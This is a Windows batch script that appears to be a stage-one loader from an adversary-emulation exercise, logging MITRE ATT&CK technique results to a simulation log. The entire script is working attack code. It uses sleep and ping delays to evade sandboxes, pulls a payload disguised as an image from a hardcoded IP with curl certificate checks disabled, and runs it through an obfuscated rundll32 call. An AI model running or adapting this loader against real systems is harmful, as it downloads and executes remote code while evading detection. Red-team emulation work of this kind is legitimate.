@echo off
SETLOCAL EnableDelayedExpansion

REM PHR placeholder assignments (random-named SET vars, one per PHR)
SET akjdh=%APPDATA%\51544\aae54fb3
SET vbnmc=d7c044e9.txt
SET zxmqp=https://3.144.153.50/test/stage/2/icon.png?QVRGQGs-R1dK
SET plkmj=BALAM-S2BO
SET qwert=QVRGQGs
SET asdfg=R1dK
SET zxcvb=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM ---- Debug: script start ----
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: script_start>> "!zxcvb!" 2>nul

REM ---- Obfuscated LOLBIN variable setup (T1027 fragment) ----
REM Only obfuscate the LOLBIN (rundll32.exe), not curl
SET bin1=rund
SET bin2=ll32
SET bin3=.exe
SET lolbin=%bin1%%bin2%%bin3%

REM Initialize delay failure flag (0=OK, 1=FAIL)
SET delay_fail=0

REM ---- Anti-sandbox execution delays (T1497) ----
REM Initial 10-20s delay (fixed 15s is acceptable)
timeout /t 15 /nobreak >nul
if errorlevel 1 SET delay_fail=1

REM Debug: start heartbeat
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_start>> "!zxcvb!" 2>nul

REM ---- Heartbeat fetch ----
REM curl is used literally (no obfuscation)
curl -k -s -o "!akjdh!\!vbnmc!" "!zxmqp!"
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_complete=FAIL>> "!zxcvb!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_complete=0>> "!zxcvb!" 2>nul
)

REM Random delay (10-20 seconds, corrected modulo)
SET /A delay=%RANDOM% %% 11 + 10
timeout /t !delay! /nobreak >nul
if errorlevel 1 SET delay_fail=1

REM ---- Change to output directory ----
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_start>> "!zxcvb!" 2>nul
cd /d "!akjdh!" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_result=1>> "!zxcvb!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_result=0>> "!zxcvb!" 2>nul
)

REM Additional delay (5-15 seconds via ping -n 9)
ping -n 9 127.0.0.1 >nul
if errorlevel 1 SET delay_fail=1

REM ---- Log T1497 after ALL delays complete ----
if !delay_fail! equ 1 (
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1497^|Virtualization/Sandbox Evasion=FAIL:delay_failure>> "!zxcvb!" 2>nul
) else (
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1497^|Virtualization/Sandbox Evasion=OK>> "!zxcvb!" 2>nul
)

REM ---- Invoke Stage 2 Loader via obfuscated LOLBIN ----
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rundll32_start>> "!zxcvb!" 2>nul
!lolbin! "!vbnmc!", RunDLLW
set run_err=!ERRORLEVEL!
if !run_err! neq 0 (
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution=FAIL:exit_code=!run_err!>> "!zxcvb!" 2>nul
) else (
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution=OK>> "!zxcvb!" 2>nul
)

REM ---- Log T1027 after LOLBIN invocation (obfuscation now applied) ----
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1027^|Obfuscated Files or Information=OK>> "!zxcvb!" 2>nul

ENDLOCAL